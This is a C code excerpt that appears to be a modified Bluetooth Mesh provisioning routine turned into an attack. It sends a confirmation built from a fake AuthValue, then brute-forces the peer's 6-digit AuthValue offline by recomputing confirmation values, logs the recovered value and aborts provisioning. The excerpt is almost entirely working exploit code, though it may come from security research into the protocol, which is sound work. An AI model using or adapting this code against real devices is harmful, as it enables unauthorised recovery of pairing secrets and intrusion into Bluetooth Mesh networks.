...
static void send_confirm(void)
{
	...
	// setup Fake AuthValue
	uint8_t fake_auth[16]={ 0x00, 0x00, 0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00, 0x00 , 0x00 , 0x00 };
	...
	//instead of sending the legitimate confirmation, send a malicious one with a fake AuthValue
	if (bt_mesh_prov_conf(bt_mesh_prov_link.conf_key, bt_mesh_prov_link.rand,
			      fake_auth, net_buf_simple_add(cfm, 16))) {
...
static void prov_random(const uint8_t *data)
{
	...
	// bruteforce 6 digits 
	uint8_t fake_auth[16]={ 0x00, 0x00, 0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 0x00, 0x01 , 0x86 , 0x9f };// fake auth value initialized to 99999 
	int AuthValue=99999;
	while (memcmp(conf_verify, bt_mesh_prov_link.conf, 16) && AuthValue<999999)
	{
		int i;
		for ( i = 15 ; i >= 0 ; i-- ) {
			if ( ++fake_auth[i] ) break;
			// continues if a value rolls over from 0xff to 0x00
		}
		AuthValue++;
		bt_mesh_prov_conf(bt_mesh_prov_link.conf_key, data, fake_auth, conf_verify);

		
	}

	BT_INFO("Bruteforced AuthValue: %d", AuthValue);

	prov_fail(PROV_ERR_UNEXP_ERR);
	return; //interrupt the Provisioning Protocol
